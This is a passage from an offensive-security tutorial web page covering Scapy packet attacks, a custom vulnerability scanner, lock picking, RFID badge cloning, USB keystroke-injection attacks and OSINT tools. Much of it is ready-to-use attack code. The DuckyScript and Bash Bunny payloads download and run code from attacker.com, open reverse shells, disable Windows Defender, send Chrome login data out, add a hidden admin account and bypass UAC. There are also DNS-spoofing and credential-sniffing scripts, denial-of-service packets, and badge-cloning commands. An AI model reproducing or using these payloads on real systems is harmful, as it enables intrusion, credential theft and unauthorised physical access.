                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=qname, ttl=10, rdata='10.0.0.5'))
            send(spoofed_pkt, verbose=0)
            print(f"[+] Spoofed DNS for {qname} → 10.0.0.5")

sniff(filter="udp port 53", prn=dns_spoof)

# Custom protocol fuzzing:

def fuzz_protocol(target, port):
    payloads = [
        b'A' * 100,
        b'A' * 1000,
        b'A' * 10000,
        b'%s%s%s%s',
        b'\xff\xff\xff\xff',
        b'\x00' * 100,
    ]
    
    for payload in payloads:
        try:
            pkt = IP(dst=target)/TCP(dport=port)/Raw(load=payload)
            reply = sr1(pkt, timeout=2, verbose=0)
            
            if not reply:
                print(f"[!] No reply for payload: {payload[:20]}...")
            elif reply.haslayer(TCP) and reply[TCP].flags == 'R':
                print(f"[!] Connection reset: {payload[:20]}...")
            else:
                print(f"[+] Normal response: {payload[:20]}...")
        except Exception as e:
            print(f"[!] Error: {e}")

# Packet sniffing with filtering:

def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        load = pkt[Raw].load
        
        # Look for credentials
        if b'password' in load.lower() or b'user' in load.lower():
            print(f"[!] Possible credentials:")
            print(f"    Source: {pkt[IP].src}:{pkt[TCP].sport}")
            print(f"    Dest: {pkt[IP].dst}:{pkt[TCP].dport}")
            print(f"    Data: {load[:100]}")

sniff(prn=packet_callback, filter="tcp", store=0)

# Generate malformed packets:

# Malformed TCP (conflicting flags):
weird_pkt = IP(dst='192.168.1.100')/TCP(flags='SFPURAE')  # All flags!
send(weird_pkt)

# Malformed IP (invalid header length):
weird_ip = IP(dst='192.168.1.100', ihl=2)/ICMP()  # ihl should be >= 5
send(weird_ip)

# Land attack (same src/dst):
land = IP(src='192.168.1.100', dst='192.168.1.100')/TCP(sport=139, dport=139, flags='S')
send(land)  # Some systems crash!

# Ping of death:
ping_of_death = fragment(IP(dst='192.168.1.100')/ICMP()/('X'*60000))
send(ping_of_death)  # Fragments > 65535 bytes</div>

            <h3>Part 3: Building a Custom Vulnerability Scanner</h3>

            <div class="code"># Let's build a multi-threaded vulnerability scanner!

import socket
import threading
import queue
from concurrent.futures import ThreadPoolExecutor

class VulnScanner:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.results = []
    
    def check_sql_injection(self, url):
        """Test for SQL injection"""
        payloads = ["'", '"', '1=1', "' OR '1'='1", '" OR "1"="1']
        
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                
                # Check for SQL errors
                errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']
                for error in errors:
                    if error in response.text.lower():
                        return f"[!] SQL Injection found: {test_url}"
            except:
                pass
        return None
    
    def check_xss(self, url):
        """Test for XSS"""
        payload = "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        test_url = f"{url}?q={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                return f"[!] XSS found: {test_url}"
        except:
            pass
        return None
    
    def check_open_redirect(self, url):
        """Test for open redirect"""
        payload = "http://evil.com"
        test_url = f"{url}?redirect={payload}"
        
        try:
            response = requests.get(test_url, allow_redirects=False, timeout=5)
            if response.status_code in [301, 302]:
                location = response.headers.get('Location', '')
                if payload in location:
                    return f"[!] Open redirect found: {test_url}"
        except:
            pass
        return None
    
    def check_lfi(self, url):
        """Test for Local File Inclusion"""
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini"
        ]
        
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if 'root:' in response.text or '[extensions]' in response.text:
                    return f"[!] LFI found: {test_url}"
            except:
                pass
        return None
    
    def check_ssrf(self, url):
        """Test for Server-Side Request Forgery"""
        # Use Burp Collaborator or similar
        payload = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
        test_url = f"{url}?url={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            if 'ami-id' in response.text or 'instance-id' in response.text:
                return f"[!] SSRF found (AWS metadata): {test_url}"
        except:
            pass
        return None
    
    def scan(self, url):
        """Run all checks"""
        checks = [
            self.check_sql_injection,
            self.check_xss,
            self.check_open_redirect,
            self.check_lfi,
            self.check_ssrf
        ]
        
        for check in checks:
            result = check(url)
            if result:
                self.results.append(result)
    
    def run(self, urls):
        """Scan multiple URLs with threading"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan, urls)
        
        return self.results

# Usage:
scanner = VulnScanner('example.com', threads=20)
urls = [
    'http://example.com/page1.php',
    'http://example.com/page2.php',
    'http://example.com/admin.php'
]

results = scanner.run(urls)
for result in results:
    print(result)

# Enhanced port scanner with service detection:

import socket
import sys
from datetime import datetime

class AdvancedScanner:
    def __init__(self, target):
        self.target = target
        self.open_ports = {}
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                service = self.grab_banner(sock, port)
                self.open_ports[port] = service
            
            sock.close()
        except Exception as e:
            pass
    
    def grab_banner(self, sock, port):
        try:
            # Try to get banner
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            return banner.split('\n')[0] if banner else 'Unknown'
        except:
            # Use common port mapping
            services = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
                53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
                443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 3389: 'RDP',
                5432: 'PostgreSQL', 6379: 'Redis', 8080: 'HTTP-Proxy',
                27017: 'MongoDB'
            }
            return services.get(port, 'Unknown')
    
    def scan_range(self, start_port, end_port):
        print(f"[*] Scanning {self.target} from port {start_port} to {end_port}")
        print(f"[*] Started at {datetime.now()}")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.scan_port, range(start_port, end_port + 1))
        
        print(f"[*] Finished at {datetime.now()}")
        print(f"\n[+] Open ports:")
        for port, service in sorted(self.open_ports.items()):
            print(f"    {port}/tcp    {service}")

# Usage:
scanner = AdvancedScanner('192.168.1.100')
scanner.scan_range(1, 1000)</div>

            <div class="metaphor-box">
                <h4>🎉 You're a Tool Builder!</h4>
                <p>You've mastered:<br><br>
                ✅ <strong>Python Exploits:</strong> Buffer overflows, format strings, heap exploits, shellcode integration<br>
                ✅ <strong>Scapy:</strong> Packet crafting, ARP spoofing, DNS spoofing, protocol fuzzing, custom scans<br>
                ✅ <strong>Custom Scanners:</strong> Multi-threaded scanning, vuln detection, service enumeration<br><br>
                <strong>Tool ideas to build:</strong><br>
                • Subdomain enumeration tool<br>
                • Credential stuffing tool<br>
                • Custom C2 framework<br>
                • Automated phishing framework<br>
                • WiFi deauth tool<br>
                • Ransomware PoC (for research!)<br>
                • Keylogger<br>
                • Browser password extractor<br><br>
                The only limit is your imagination! Every tool you build makes you more powerful. 🛠️🚀</p>
            </div>
        </section>

        <!-- SECTION 10: Physical Security & Social Engineering -->
        <section id="physical-security" class="section">
            <h2 class="section-title">Physical Security & Social Engineering</h2>
            <p class="section-intro">The human element is always the weakest link. You can have perfect firewalls, encrypted disks, and multi-factor authentication—but if someone tailgates through the door or plugs in a USB Rubber Ducky, game over! Physical security attacks bypass technical controls entirely. This section covers lock picking, badge cloning (RFID/NFC), USB attack platforms (Rubber Ducky, Bash Bunny, O.MG Cable), social engineering tactics, phishing campaigns, pretexting, and physical penetration testing methodology. By the end, you'll understand how hackers walk through front doors!</p>

            <div class="metaphor-box">
                <h4>💡 Physical Security = The Front Door Hack</h4>
                <p><strong>Why physical attacks work:</strong><br><br>
                • <strong>Bypass network defenses:</strong> No firewall stops a person walking in<br>
                • <strong>Direct access:</strong> Physical = root/admin by definition<br>
                • <strong>Social trust:</strong> Humans trust confident people with badges<br>
                • <strong>Low detection:</strong> No IDS alerts when picking a lock<br><br>
                <strong>Famous physical hacks:</strong><br>
                • <strong>2011 RSA breach:</strong> Started with spear-phishing USB drive left in parking lot<br>
                • <strong>Stuxnet:</strong> USB worm infected air-gapped Iranian nuclear facility<br>
                • <strong>Social engineering:</strong> Kevin Mitnick never needed to code—he just called people<br><br>
                Physical security testing finds the holes that digital audits miss! 🚪🔐</p>
            </div>

            <h3>Part 1: Lock Picking Fundamentals</h3>

            <div class="info-box">
                <h4>How Locks Work (Pin Tumbler)</h4>
                <p><strong>Basic mechanism:</strong><br>
                • <strong>Pins:</strong> Spring-loaded pins inside lock (usually 5-6 pins)<br>
                • <strong>Shear line:</strong> Boundary between plug and housing<br>
                • <strong>Key:</strong> Raises pins to correct height → all pins at shear line → plug rotates<br><br>
                <strong>Without correct key:</strong><br>
                Pins block plug from rotating<br><br>
                <strong>With correct key:</strong><br>
                All pins align at shear line → plug rotates → lock opens<br><br>
                <strong>Lock picking principle:</strong><br>
                Apply slight rotational tension → Pins bind at different rates → Set pins one by one → All pins set → Lock opens!</p>
            </div>

            <div class="code"># Lock Picking Tools:

# 1. Tension Wrench (most important!)
# Applies rotational force to plug
# Types:
#   - L-shaped (classic)
#   - Z-shaped (fits different keyways)
#   - Flat (bottom-of-keyway)

# 2. Pick (manipulates pins)
# Types:
#   - Hook pick (single pin picking)
#   - Rake (multiple pins simultaneously)
#   - Diamond pick (versatile)
#   - Half-diamond (better control)

# 3. Specialized Tools:
#   - Broken key extractor
#   - Decoder (reads pin heights)
#   - Plug spinner (reverses plug)
#   - Bump key (mechanical exploit)
#   - Snap gun (mechanical vibration)

# Single Pin Picking (SPP) Technique:

# Step 1: Insert tension wrench
# Place in bottom or top of keyway
# Apply LIGHT rotational pressure (like turning a key)
# Too much = pins bind (can't move)
# Too little = pins don't set

# Step 2: Insert pick above tension wrench
# Feel for pins (little bumps inside lock)
# There should be 5-6 pins

# Step 3: Push each pin up
# One pin will be "binding" (harder to push)
# This is the first pin to set
# Push binding pin until you feel/hear a click
# Plug will rotate slightly

# Step 4: Repeat for remaining pins
# New pin will bind
# Set it
# Continue until all pins set
# Plug rotates fully → lock opens!

# Raking Technique (faster, less precise):

# Step 1: Insert tension wrench (light pressure)

# Step 2: Insert rake pick
# Scrub rake in and out rapidly
# Pins bounce up and down
# Some will randomly land at shear line

# Step 3: Increase tension gradually
# As pins set, increase rotational force
# Lock may open after 10-30 seconds of raking

# Practice locks:
# • Clear acrylic practice locks (see pins moving!)
# • Master Lock #3 (beginner lock)
# • Kwikset deadbolts (common residential)
# • Schlage pins (medium difficulty)
# • Medeco locks (advanced, security pins)

# Legal Note:
# Lock picking is LEGAL in most jurisdictions if:
#   - You own the lock, OR
#   - You have written permission, OR
#   - You're a locksmith
# 
# ILLEGAL if:
#   - You possess picks with intent to commit crime
#   - You pick locks you don't own without permission
#
# Check your local laws!</div>

            <h4>Bypassing Locks (Without Picking)</h4>

            <div class="code"># Lock bypasses are faster than picking!

# 1. Bumping
# Uses specially cut "bump key"
# Exploits pin inertia

# How it works:
# - Insert bump key (cut to lowest depth on all positions)
# - Pull out one click
# - Apply light rotational tension
# - Strike key with hammer/screwdriver
# - All pins jump simultaneously
# - Brief moment where all pins at shear line
# - Plug rotates → lock opens!

# Success rate: 90%+ on pin tumbler locks
# Time: 5-30 seconds
# Noise: Moderate (bump sound)

# 2. Shimming (Padlocks)
# Thin metal strip defeats locking mechanism

# Step 1: Cut soda can into thin strip
# Step 2: Insert between shackle and body
# Step 3: Push down on shackle
# Step 4: Shim slides past locking pawl
# Step 5: Padlock opens!

# Works on: Cheap padlocks (Master Lock, etc.)
# Doesn't work on: Higher-security padlocks with ball bearings

# 3. Impressioning
# Create working key from blank

# Step 1: Insert blank key
# Step 2: Apply heavy rotational force
# Step 3: Pins leave marks on blank
# Step 4: File down marked areas
# Step 5: Repeat until key works

# Time: 30 minutes to 2 hours
# Skill: Advanced
# Result: Working key!

# 4. Bypass Tools
# • Under-door tool (reaches inside, unlocks from interior)
# • Latch slipping (credit card trick on spring latches)
# • Emergency exit exploitation (push bars can be manipulated)

# 5. Destructive Entry (last resort)
# • Drilling (destroy pins)
# • Snapping (Euro-cylinder vulnerability)
# • Prying (force shackle/bolt)
# • Cutting (angle grinder, bolt cutters)</div>

            <h3>Part 2: RFID/NFC Badge Cloning</h3>

            <div class="code"># Many buildings use RFID/NFC badges for access control
# Problem: Most use 125kHz HID Prox or 13.56MHz Mifare
# Solution: Clone badges with $40 device!

# Hardware: Proxmark3 (professional) or Flipper Zero (portable)

# Proxmark3 Setup:
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
make clean && make all

# Connect Proxmark3 via USB
./pm3

# Proxmark3 console starts:
[=] Session log /root/.proxmark3/logs/log_20260108.txt
[+] loaded from JSON file /root/.proxmark3/preferences.json

# Identify card type:
proxmark3> lf search

# Output (125kHz HID Prox):
[+] HID Prox TAG ID: 2006e11e (8838) - Format Len: 26 bit - FC: 100 - Card: 1822

# Clone to T5577 writable card:
proxmark3> lf hid clone 2006e11e

# Output:
[=] Cloning tag with ID 2006e11e
[=] Done

# Test cloned card:
proxmark3> lf hid read

# Should show same ID!

# 13.56MHz Mifare Classic:
proxmark3> hf search

# Output:
[+] UID: 01 02 03 04
[+] ATQA: 00 04
[+] SAK: 08 [2]
[+] Mifare Classic 1K

# Check for default keys:
proxmark3> hf mf chk *1 ?

# Output:
[+] Sector 0, key type A, key: FFFFFFFFFFFF (default)
[+] Sector 1, key type A, key: FFFFFFFFFFFF
[... 90% of cards still use default keys! ...]

# Dump card:
proxmark3> hf mf dump

# Creates: hf-mf-01020304-dump.bin

# Clone to blank Mifare card:
proxmark3> hf mf restore

# Select: hf-mf-01020304-dump.bin
# Clone complete!

# NFC credit card reading:
proxmark3> hf 14a info

# Output (contactless credit card):
[+] UID: AA BB CC DD
[+] ATQA: 00 04
[+] SAK: 20 [3]
[+] TYPE: NXP MIFARE DESFire

# Read card data:
proxmark3> hf 14a reader

# Some cards expose:
# - Card number (PAN)
# - Expiry date
# - Cardholder name
# - Transaction history

# Note: Can't extract CVV (stored on magnetic stripe only)

# Flipper Zero (Portable Alternative):

# Read 125kHz badge:
# RFID → Read → [Hold badge to device]
# → Save as "Office_Badge"

# Emulate badge:
# RFID → Saved → Office_Badge → Emulate
# [Hold Flipper to reader]
# → Door unlocks!

# Read 13.56MHz card:
# NFC → Read → [Hold card to device]
# → Shows UID and data

# Emulate card:
# NFC → Saved → [Select card] → Emulate

# Defense Against Badge Cloning:
# • Use high-frequency encrypted cards (iCLASS SE, Seos)
# • Implement two-factor (badge + PIN)
# • RFID-blocking sleeves
# • Monitor for duplicate badge usage
# • Short-range readers (require very close proximity)</div>

            <h3>Part 3: USB Attack Platforms</h3>

            <h4>USB Rubber Ducky</h4>

            <div class="code"># USB Rubber Ducky = Keystroke injection tool
# Looks like USB flash drive
# Acts like USB keyboard
# Types commands VERY fast (1000 characters/second!)

# Hardware: https://shop.hak5.org/products/usb-rubber-ducky

# Programming Language: DuckyScript

# Example Payload (Windows):

# File: payload.txt

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER

# Explanation:
# DELAY 1000        → Wait 1 second (for system to recognize USB)
# GUI r             → Open Run dialog (Windows key + R)
# DELAY 500         → Wait for dialog to appear
# STRING ...        → Type PowerShell command
# ENTER             → Execute command

# This downloads and runs payload from attacker server!

# More DuckyScript commands:

# REM Comment
# Used for documentation

# DELAY milliseconds
DELAY 2000  # Wait 2 seconds

# STRING text
STRING Hello World  # Types: Hello World

# ENTER, SPACE, TAB, ESCAPE
ENTER

# GUI (Windows key), CTRL, ALT, SHIFT
GUI
CTRL a
ALT F4

# Function keys
F1
F12

# REPEAT n
REPEAT 5
STRING Hello
ENTER
END_REPEAT

# Examples:

# 1. Reverse Shell Payload (Windows):
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"
ENTER

# 2. Disable Windows Defender:
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
DELAY 2000
ENTER
DELAY 3000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER

# 3. Exfiltrate Chrome Passwords (Windows):
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden "$data = Get-Content $env:LOCALAPPDATA\Google\Chrome\User Data\Default\'Login Data' -Raw; Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body $data"
ENTER

# 4. Create Admin User:
DELAY 1000
GUI r
DELAY 500
STRING cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add
ENTER

# 5. Rick Roll (harmless prank):
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER

# Compiling DuckyScript:
# Use Hak5 encoder: https://duck-encoder.netlify.app/
# Or command-line tool:
java -jar encoder.jar -i payload.txt -o inject.bin

# Copy inject.bin to Rubber Ducky SD card</div>

            <h4>Bash Bunny</h4>

            <div class="code"># Bash Bunny = Multi-vector USB attack platform
# Can act as: Keyboard, Ethernet, Serial, Mass Storage
# Runs Linux, supports any scripting language

# Hardware: https://shop.hak5.org/products/bash-bunny

# Switch Positions:
# • Switch 1: Payload in /payloads/switch1/
# • Switch 2: Payload in /payloads/switch2/
# • Switch 3: Arming mode (for payload development)

# Example Payload (QuickCreds):

#!/bin/bash
# Title: QuickCreds
# Description: Harvests credentials from Windows
# Author: Hak5

# LED color feedback
LED R  # Red = starting

# Attack mode: Ethernet + mass storage
ATTACKMODE RNDIS_ETHERNET STORAGE

# Get victim's IP
GET TARGET_IP

# Start responder (captures NTLM hashes)
python /tools/responder/Responder.py -I usb0 -wrf

# LED green = capturing
LED G

# Wait for hashes
sleep 60

# Save hashes to /loot/
cp /tools/responder/logs/* /loot/

# LED blue = done
LED B

# Another payload (UAC Bypass + Backdoor):

#!/bin/bash
LED R

ATTACKMODE HID STORAGE

Q DELAY 1000
Q GUI r
Q DELAY 500
Q STRING powershell
Q ENTER
Q DELAY 1000

# Check if admin
Q STRING [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
Q ENTER

# If not admin, UAC bypass:
Q STRING New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Q ENTER
Q STRING Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start powershell" -Force
Q ENTER
Q STRING Start-Process computerdefaults.exe
Q DELAY 3000

# Download and execute beacon:
Q STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')
Q ENTER

LED G

# O.MG Cable (malicious USB cable):

# Looks: Exactly like normal Lightning/USB-C cable
# Reality: Hidden WiFi chip + keystroke injection
# Access: WiFi hotspot (O.MG-XXXX)
# Web interface: http://192.168.4.1

# Payloads same as Rubber Ducky
# Advantage: Victim thinks it's just a charging cable!

# Detection Difficulty: VERY HIGH
# Defense: Only use your own cables, inspect electronics</div>

            <div class="metaphor-box">
                <h4>🎉 You're a Physical Pentester!</h4>
                <p>You've mastered:<br><br>
                ✅ <strong>Lock Picking:</strong> Pin tumbler mechanism, SPP, raking, bumping, shimming, impressioning<br>
                ✅ <strong>Badge Cloning:</strong> Proxmark3, Flipper Zero, HID Prox, Mifare Classic, NFC<br>
                ✅ <strong>USB Attacks:</strong> Rubber Ducky, Bash Bunny, O.MG Cable, DuckyScript, keystroke injection<br><br>
                <strong>Physical pentesting methodology:</strong><br>
                1. <strong>Reconnaissance:</strong> Scout building, identify entry points, observe employees<br>
                2. <strong>Pretexting:</strong> Create believable cover story (IT contractor, delivery person, fire inspector)<br>
                3. <strong>Entry:</strong> Tailgate, badge clone, lock pick, or social engineering<br>
                4. <strong>Access:</strong> Plug in Bash Bunny, USB Rubber Ducky, or rogue WiFi AP<br>
                5. <strong>Persistence:</strong> Install physical backdoor (hidden Pi Zero, rogue AP, keylogger)<br>
                6. <strong>Exfiltration:</strong> Steal documents, plant listening devices, photograph screens<br>
                7. <strong>Exit:</strong> Leave no trace, maintain cover story<br><br>
                Physical security bypasses ALL network defenses. Never underestimate the power of walking through the door! 🚪🔓</p>
            </div>
        </section>

        <!-- SECTION 11: Advanced OSINT & Reconnaissance -->
        <section id="advanced-osint" class="section">
            <h2 class="section-title">Advanced OSINT & Reconnaissance</h2>
            <p class="section-intro">Open Source Intelligence (OSINT) is the art of finding information hiding in plain sight. Before hacking, you need targets, credentials, vulnerabilities, employees, infrastructure, and attack surface understanding. OSINT provides ALL of this without touching the target network! This section covers Maltego for relationship mapping, theHarvester for email/subdomain enumeration, Recon-ng modular framework, Shodan IoT search engine mastery, advanced Google dorking, LinkedIn reconnaissance, breach databases, WHOIS/DNS analysis, and OSINT automation. By the end, you'll know more about your target than they know about themselves!</p>

            <div class="metaphor-box">
                <h4>💡 OSINT = Google-Fu on Steroids</h4>
                <p><strong>What can you find with OSINT?</strong><br><br>
                • <strong>Employees:</strong> Names, emails, phone numbers, job titles, LinkedIn profiles<br>
                • <strong>Infrastructure:</strong> IP ranges, subdomains, email servers, DNS records, cloud assets<br>
                • <strong>Credentials:</strong> Breach databases, pastes, old dumps, password patterns<br>
                • <strong>Vulnerabilities:</strong> Shodan for exposed services, old CVEs, misconfigurations<br>
                • <strong>Physical locations:</strong> Google Maps, employee check-ins, geotagged photos<br>
                • <strong>Technologies:</strong> Wappalyzer, BuiltWith, job postings mentioning stack<br><br>
                <strong>Famous OSINT wins:</strong><br>
                • Bellingcat identified Russian military using geotagged social media photos<br>
                • Security researchers find 0-days by searching Shodan for vulnerable IoT devices<br>
                • Social engineering pretext built entirely from LinkedIn + breach databases<br><br>
                OSINT is LEGAL, PASSIVE, and POWERFUL! 🔍🌐</p>
            </div>

            <h3>Part 1: Maltego - Visual Link Analysis</h3>

            <div class="code"># Maltego = Graph-based OSINT tool (visual relationship mapping)
# Free Community Edition available

# Install:
# Download from: https://www.maltego.com/downloads/
# Or via Kali:
sudo apt install maltego

# Launch:
maltego

# First run: Register for free API key

# Creating Investigation:

# 1. New Graph
# 2. Add Entity (drag from palette):
#    - Domain
#    - Person
#    - Email Address
#    - Phone Number
#    - IP Address
#    - etc.

# 3. Run Transform:
# Right-click entity → All Transforms
# Or specific transform:
#    - DNS from Domain
#    - Email Addresses from Domain
#    - Files and Documents from Domain

# Example: Investigate company.com

# Step 1: Add \"Domain\" entity
# Value: company.com

# Step 2: Run Transform \"DNS from Domain\"
# Returns:
#   - NS records (nameservers)
#   - MX records (mail servers)
#   - A records (IP addresses)

# Step 3: Run Transform \"Email Addresses from Domain\"
# Searches:
#   - Google
#   - Bing
#   - PGP key servers
#   - Public documents
# Returns: john@company.com, admin@company.com, etc.

# Step 4: From email addresses → \"Person from Email\"
# Returns: Names associated with emails

# Step 5: From names → \"Phones from Person\"
# Searches social media, WHOIS, etc.
# Returns: Phone numbers

# Step 6: From phones → \"Location from Phone\"
# Returns: Geographic location

# After 5-10 transforms:
# Graph shows:
#   - 50+ entities
#   - Relationships between all
#   - Visual network map
#   - Attack surface!

# Advanced Transforms:

# VirusTotal Integration:
# Domain → VirusTotal Passive DNS
# Shows all subdomains ever resolved

# Shodan Integration:
# IP Address → Shodan Details
# Shows open ports, services, vulnerabilities

# Social Media:
# Person → Twitter from Person
# Email → Social Network from Email

# Document Metadata:
# Domain → Documents from Domain
# → Metadata from Document
# Extracts: Author names, software versions, file paths

# Custom Transforms:

# You can write Python transforms!
# Template:

from maltego_trx.entities import Domain, IPAddress
from maltego_trx.transform import DiscoverableTransform

class DNSToIP(DiscoverableTransform):
    @classmethod
    def create_entities(cls, request, response):
        domain = request.Value
        
        # Resolve DNS
        import socket
        ip = socket.gethostbyname(domain)
        
        # Add IP entity to graph
        response.addEntity(IPAddress, ip)

# Maltego Use Cases:

# 1. Corporate Investigation
# Start: Company domain
# Discover: All employees, emails, subdomains, IPs, social media

# 2. Person Investigation
# Start: Email address
# Discover: Real name, phone, addresses, social profiles, relatives

# 3. Infrastructure Mapping
# Start: Single IP
# Discover: All related IPs, domains, ASN, hosting provider

# 4. Breach Investigation
# Start: Leaked email
# Discover: Other breaches, password patterns, reused credentials

# Maltego Machines (Automated):

# Pre-built investigation workflows
# Example: \"Footprint L1\" machine
#   1. Adds domain
#   2. Resolves DNS
#   3. Finds emails
#   4. Enumerates subdomains
#   5. Maps infrastructure
# All automatic!

# Output:
# Export graph as:
#   - PDF report
#   - CSV data
#   - Image (PNG)
#   - Maltego graph file</div>

            <h3>Part 2: theHarvester - Email & Subdomain Harvesting</h3>

            <div class="code"># theHarvester = Fast OSINT tool for emails, subdomains, IPs

# Install (comes with Kali):
sudo apt install theharvester

# Or latest version:
git clone https://github.com/laramies/theHarvester
cd theHarvester
pip3 install -r requirements.txt

# Basic usage:
theHarvester -d company.com -b all

# Flags:
# -d domain     → Target domain
# -b source     → Data source (google, bing, linkedin, etc.)
# -l limit      → Limit results (default: 500)
# -f file       → Save to HTML/XML/JSON

# Data sources:

# 1. Search Engines:
theHarvester -d company.com -b google
theHarvester -d company.com -b bing
theHarvester -d company.com -b yahoo

# 2. Social Networks:
theHarvester -d company.com -b linkedin
theHarvester -d company.com -b twitter

# 3. Certificate Transparency:
theHarvester -d company.com -b certspotter
theHarvester -d company.com -b crtsh

# Returns ALL subdomains from SSL certificates!

# 4. DNS Databases:
theHarvester -d company.com -b dnsdumpster
theHarvester -d company.com -b threatcrowd

# 5. Shodan:
theHarvester -d company.com -b shodan -s YOUR_SHODAN_API_KEY

# 6. VirusTotal:
theHarvester -d company.com -b virustotal

# 7. All sources at once:
theHarvester -d company.com -b all

# Output:
# [*] Harvesting emails...
# john.doe@company.com
# jane.smith@company.com
# admin@company.com
# support@company.com
# 
# [*] Harvesting subdomains...
# mail.company.com
# vpn.company.com
# dev.company.com
# staging.company.com
# api.company.com
# 
# [*] Harvesting IP addresses...
# 192.0.2.10
# 192.0.2.11
# 
# [*] Harvesting URLs...
# https://www.company.com/careers
# https://www.company.com/contact

# Advanced usage:

# Save results:
theHarvester -d company.com -b all -f company_report

# Output formats:
# company_report.html
# company_report.xml
# company_report.json

# Limit results:
theHarvester -d company.com -b google -l 100

# Only 100 results from Google

# Virtual host discovery:
theHarvester -d company.com -v

# Verifies if subdomains are alive

# DNS brute force:
theHarvester -d company.com -c

# Brute-forces common subdomain names

# Parsing results with Python:

import json

with open('company_report.json', 'r') as f:
    data = json.load(f)

emails = data['emails']
subdomains = data['hosts']

print(f\"Found {len(emails)} emails\")
print(f\"Found {len(subdomains)} subdomains\")

# Use for:
# - Phishing campaign target list
# - Subdomain takeover checks
# - Password spraying attacks
# - Infrastructure mapping</div>

            <h3>Part 3: Recon-ng - Modular Reconnaissance Framework</h3>

            <div class="code"># Recon-ng = Metasploit for reconnaissance
# Modular, scriptable, database-backed

# Install:
sudo apt install recon-ng

# Or latest:
git clone https://github.com/lanmaster53/recon-ng.git
cd recon-ng
pip3 install -r REQUIREMENTS

# Launch:
recon-ng

# Recon-ng console:
[recon-ng][default] > 

# Create workspace:
[recon-ng][default] > workspaces create company_investigation

# Add domain:
[recon-ng][company_investigation] > db insert domains
domain (TEXT): company.com

# View domains:
[recon-ng][company_investigation] > db query SELECT * FROM domains

# Install modules:
[recon-ng][company_investigation] > marketplace search

# Install specific module:
[recon-ng][company_investigation] > marketplace install recon/domains-hosts/bing_domain_web

# View installed modules:
[recon-ng][company_investigation] > modules search

# Load module:
[recon-ng][company_investigation] > modules load recon/domains-hosts/bing_domain_web

# Set source:
[recon-ng][company_investigation][bing_domain_web] > options set SOURCE company.com

# Run module:
[recon-ng][company_investigation][bing_domain_web] > run

# Output:
# [*] Searching Bing for: site:company.com
# [*] mail.company.com
# [*] vpn.company.com
# [*] dev.company.com
# 
# [*] 3 hosts added to database

# View results:
[recon-ng][company_investigation] > db query SELECT * FROM hosts

# Useful modules:

# 1. Subdomain enumeration:
modules load recon/domains-hosts/certificate_transparency
run

modules load recon/domains-hosts/google_site_web
run

modules load recon/domains-hosts/hackertarget
run

# 2. Email harvesting:
modules load recon/domains-contacts/hunter_io
options set SOURCE company.com
run

# 3. Employee discovery:
modules load recon/companies-contacts/linkedin_contacts
options set SOURCE Company Name
run

# 4. IP to geolocation:
modules load recon/hosts-hosts/ipinfodb
run

# 5. Shodan integration:
modules load recon/hosts-ports/shodan_ip
options set SOURCE 192.0.2.10
run

# 6. Breach data:
modules load recon/contacts-credentials/hibp_breach
# (HaveIBeenPwned API)

# Reporting:

# Export to HTML:
[recon-ng][company_investigation] > db query SELECT * FROM hosts
# Copy-paste to report

# Or use reporting modules:
modules load reporting/html
options set FILENAME company_report.html
options set CREATOR \"Your Name\"
run

# Automation with Python:

from recon.core import base
import os

# Create recon-ng instance
r = base.Recon(base.Mode.CLI)

# Create workspace
r.do_workspaces('create test_workspace')

# Add domain
r.do_db('insert domains')
# Input: company.com

# Load and run module
r.do_modules('load recon/domains-hosts/bing_domain_web')
r.do_options('set SOURCE company.com')
r.do_run('')

# Query results
r.do_db('query SELECT * FROM hosts')</div>

            <h3>Part 4: Shodan - IoT & Infrastructure Search Engine</h3>

            <div class="code"># Shodan = "Google for hackers"
# Indexes: Webcams, routers, SCADA, databases, IoT devices

# Web interface: https://www.shodan.io

# CLI tool:
pip install shodan

# Initialize with API key (free tier: 100 queries/month):
shodan init YOUR_API_KEY

# Basic searches:

# Find specific service:
shodan search apache

# Find in specific country:
shodan search apache country:US

